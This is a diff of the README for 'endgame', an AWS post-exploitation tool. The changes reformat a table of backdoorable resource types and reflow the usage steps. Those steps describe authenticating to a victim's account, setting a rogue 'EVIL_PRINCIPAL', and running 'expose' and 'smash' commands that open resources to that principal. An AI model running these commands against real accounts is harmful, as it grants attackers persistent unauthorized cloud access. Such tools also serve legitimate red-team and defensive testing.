@@ -17,23 +17,23 @@ endgame smash --service all --evil-principal * --undo --dry-run
 
 ## Supported Backdoors
 
-| Backdoored Resource Type      | Support | Access Analyzer Support |
-|-------------------------------|---------|-------------------------|
-| ACM PCA                       | ✅     | ❌                       |
-| CloudWatch Resource Policies  | ✅     | ❌                       |
-| ECR Repositories              | ✅     | ❌                       |
-| EFS File Systems              | ✅     | ❌                       |
-| ElasticSearch Domains         | ✅     | ❌                       |
-| Glacier Vault Access Policies | ✅     | ❌                       |
-| IAM Roles                     | ✅     | ✅                       |
-| KMS Keys                      | ✅     | ✅                       |
-| Lambda Functions              | ✅     | ✅                       |
-| Lambda Layers                 | ✅     | ✅                       |
-| S3 Buckets                    | ✅     | ✅                       |
-| Secrets Manager Secrets       | ✅     | ✅                       |
-| SES Identity Policies         | ✅     | ❌                       |
-| SQS Queues                    | ✅     | ✅                       |
-| SNS Topics                    | ✅     | ❌                       |
+| Backdoor   Resource Type      | Support | AWS Access Analyzer Support [1] |
+|-------------------------------|---------|-------------------------        |
+| ACM PCA                       | ✅     | ❌                              |
+| CloudWatch Resource Policies  | ✅     | ❌                              |
+| ECR Repositories              | ✅     | ❌                              |
+| EFS File Systems              | ✅     | ❌                              |
+| ElasticSearch Domains         | ✅     | ❌                              |
+| Glacier Vault Access Policies | ✅     | ❌                              |
+| IAM Roles                     | ✅     | ✅                              |
+| KMS Keys                      | ✅     | ✅                              |
+| Lambda Functions              | ✅     | ✅                              |
+| Lambda Layers                 | ✅     | ✅                              |
+| S3 Buckets                    | ✅     | ✅                              |
+| Secrets Manager Secrets       | ✅     | ✅                              |
+| SES Identity Policies         | ✅     | ❌                              |
+| SQS Queues                    | ✅     | ✅                              |
+| SNS Topics                    | ✅     | ❌                              |
 
 ## Installation
 
@@ -49,23 +49,21 @@ python3 -m pip install -q ./dist/endgame*.tar.gz
 
 * First, authenticate to AWS CLI using credentials to the victim's account.
 
-* Set `EVIL_PRINCIPAL` environment variable to the rogue IAM User or Role that you want to give access to.
+* Set the environment variables for `EVIL_PRINCIPAL` (required). Optionally, set the environment variables for `AWS_REGION` and `AWS_PROFILE`
 
 ```bash
+# Set `EVIL_PRINCIPAL` environment variable to the rogue IAM User or 
+# Role that you want to give access to.
 export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
-```
 
-* (_Optional_) Set `AWS_REGION` to the AWS Region and `AWS_PROFILE` to the profile in `~/.aws/credentials` that you want to use.
-
-```bash
 # If you don't supply these values, these will be the defaults.
 export AWS_REGION="us-east-1"
 export AWS_PROFILE="default"
 ```
 
-### Create Demo Infrastructure
+* Create the Terraform demo infrastructure
 
-* 🚨This will create real AWS infrastructure and will cost you money! 🚨
+> 🚨This will create real AWS infrastructure and will cost you money! 🚨
 
 ```bash
 make terraform-demo
@@ -95,7 +93,9 @@ endgame list-resources --service s3
 endgame expose --service iam --name test-resource-exposure --dry-run
 ```
 
-* To create the backdoor to that resource from your rogue account (🚨this is not a drill🚨):
+* To create the backdoor to that resource from your rogue account
+
+> 🚨this is not a drill🚨
 
 ```
 endgame expose --service iam --name test-resource-exposure
@@ -113,7 +113,6 @@ endgame expose --service iam --name test-resource-exposure --undo
 
 > ![Expose undo](docs/images/add-myself-undo.png)
 
-
 ### Expose everything
 
 ```bash
@@ -126,7 +125,7 @@ endgame smash --service all --undo
 
 ### Backdoors via Resource-based Policies
 
-| Backdoored Resource Type      | Support | Access Analyzer Support [1] |
+| Backdoor   Resource Type      | Support | AWS Access Analyzer Support [1] |
 |-------------------------------|---------|-------------------------    |
 | ACM PCA                       | ✅     | ❌                          |
 | CloudWatch Resource Policies  | ✅     | ❌                          |
